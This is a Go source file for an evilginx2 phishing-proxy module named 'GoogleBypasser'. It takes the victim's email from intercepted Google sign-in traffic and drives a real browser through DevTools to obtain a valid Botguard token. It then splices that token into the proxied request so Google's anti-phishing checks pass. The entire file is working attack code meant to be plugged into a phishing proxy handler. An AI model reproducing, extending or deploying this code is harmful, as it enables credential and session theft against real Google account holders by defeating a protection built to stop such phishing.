// File: core/google_bypass.go
package core

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/proto"
	"github.com/kgretzky/evilginx2/log"
)

type GoogleBypasser struct {
	browser        *rod.Browser
	page           *rod.Page
	isHeadless     bool
	withDevTools   bool
	slowMotionTime time.Duration
	token          string
	email          string
	mu             sync.Mutex
}

var (
	bgRegexp   = regexp.MustCompile(`"bgRequest":"([a-zA-Z0-9\-_]+)"`)
	emailRegex = regexp.MustCompile(`"V1UmUe","\[\\"null,\\\\"([^\\\\]+)\\\\"`)
)

func getWebSocketDebuggerURL() (string, error) {
	resp, err := http.Get("http://127.0.0.1:9222/json")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var targets []map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&targets); err != nil {
		return "", err
	}
	if len(targets) == 0 {
		return "", fmt.Errorf("no targets found")
	}

	wsURL, ok := targets[0]["webSocketDebuggerUrl"].(string)
	if !ok {
		return "", fmt.Errorf("invalid websocket URL")
	}
	return wsURL, nil
}

func (b *GoogleBypasser) Launch() {
	b.mu.Lock()
	defer b.mu.Unlock()

	log.Debug("[GoogleBypasser]: Launching Browser...")
	wsURL, err := getWebSocketDebuggerURL()
	if err != nil {
		log.Error("[GoogleBypasser]: Failed to get WebSocket URL: %v", err)
		return
	}

	b.browser = rod.New().ControlURL(wsURL)
	if b.slowMotionTime > 0 {
		b.browser = b.browser.SlowMotion(b.slowMotionTime)
	}
	b.browser = b.browser.MustConnect()
	b.page = b.browser.MustPage()
	log.Debug("[GoogleBypasser]: Browser connected.")
}

func (b *GoogleBypasser) GetEmail(body []byte) {
	matches := emailRegex.FindSubmatch(body)
	if len(matches) < 2 {
		log.Debug("[GoogleBypasser]: No email found")
		return
	}
	decoded := string(matches[1])
	b.email = strings.ReplaceAll(decoded, `\x40`, "@")
	log.Debug("[GoogleBypasser]: Email: %s", b.email)
}

func (b *GoogleBypasser) GetToken() {
	b.mu.Lock()
	defer b.mu.Unlock()

	stop := make(chan struct{})
	timeout := time.After(120 * time.Second)

	go b.page.EachEvent(func(e *proto.NetworkRequestWillBeSent) {
		if strings.Contains(e.Request.URL, "/v3/signin/_/AccountsSignInUi/data/batchexecute") &&
			strings.Contains(e.Request.URL, "rpcids=V1UmUe") {

			// PostData is a string, not a pointer - check if empty
			if e.Request.PostData == "" {
				return
			}

			decodedBody, err := url.QueryUnescape(e.Request.PostData)
			if err != nil {
				return
			}

			matches := bgRegexp.FindStringSubmatch(decodedBody)
			if len(matches) > 1 {
				b.token = matches[1]
				log.Debug("[GoogleBypasser]: Token obtained: %s", b.token)
				close(stop)
			}
		}
	})()

	if err := b.page.Navigate("https://accounts.google.com/"); err != nil {
		log.Error("[GoogleBypasser]: Navigation failed: %v", err)
		return
	}

	b.page.MustWaitLoad()

	emailField, err := b.page.Element("#identifierId")
	if err != nil || emailField == nil {
		log.Error("[GoogleBypasser]: Email field not found")
		return
	}

	if err := emailField.Input(b.email); err != nil {
		log.Error("[GoogleBypasser]: Failed to input email: %v", err)
		return
	}

	if err := b.page.Keyboard.Press(input.Enter); err != nil {
		log.Error("[GoogleBypasser]: Failed to submit: %v", err)
		return
	}

	select {
	case <-stop:
		log.Debug("[GoogleBypasser]: Token captured successfully")
	case <-timeout:
		log.Error("[GoogleBypasser]: Timeout waiting for token")
	}
}

func (b *GoogleBypasser) ReplaceTokenInBody(body []byte) []byte {
	if b.token == "" {
		return body
	}
	return bgRegexp.ReplaceAll(body, []byte(`"bgRequest":"`+b.token+`"`))
}

func (b *GoogleBypasser) Close() {
	b.mu.Lock()
	defer b.mu.Unlock()
	if b.page != nil {
		b.page.Close()
	}
	if b.browser != nil {
		b.browser.Close()
	}
}

// ProcessGoogleBotguard is the main entry point - call this from your proxy handler
func ProcessGoogleBotguard(req *http.Request, body []byte) []byte {
	if !strings.EqualFold(req.Host, "accounts.google.com") {
		return body
	}

	if !strings.Contains(req.URL.Path, "/v3/signin/_/AccountsSignInUi/data/batchexecute") {
		return body
	}

	if !strings.Contains(req.URL.RawQuery, "rpcids=V1UmUe") {
		return body
	}

	log.Debug("[GoogleBypasser]: Processing Botguard request")

	decodedBody, err := url.QueryUnescape(string(body))
	if err != nil {
		log.Error("[GoogleBypasser]: Failed to decode: %v", err)
		return body
	}

	b := &GoogleBypasser{
		isHeadless:     false,
		slowMotionTime: 1500 * time.Millisecond,
	}

	b.Launch()
	b.GetEmail([]byte(decodedBody))

	if b.email != "" {
		b.GetToken()
		modifiedBody := b.ReplaceTokenInBody([]byte(decodedBody))
		b.Close()

		// Re-encode as form data
		postForm, err := url.ParseQuery(string(modifiedBody))
		if err == nil {
			return []byte(postForm.Encode())
		}
	}

	b.Close()
	return body
}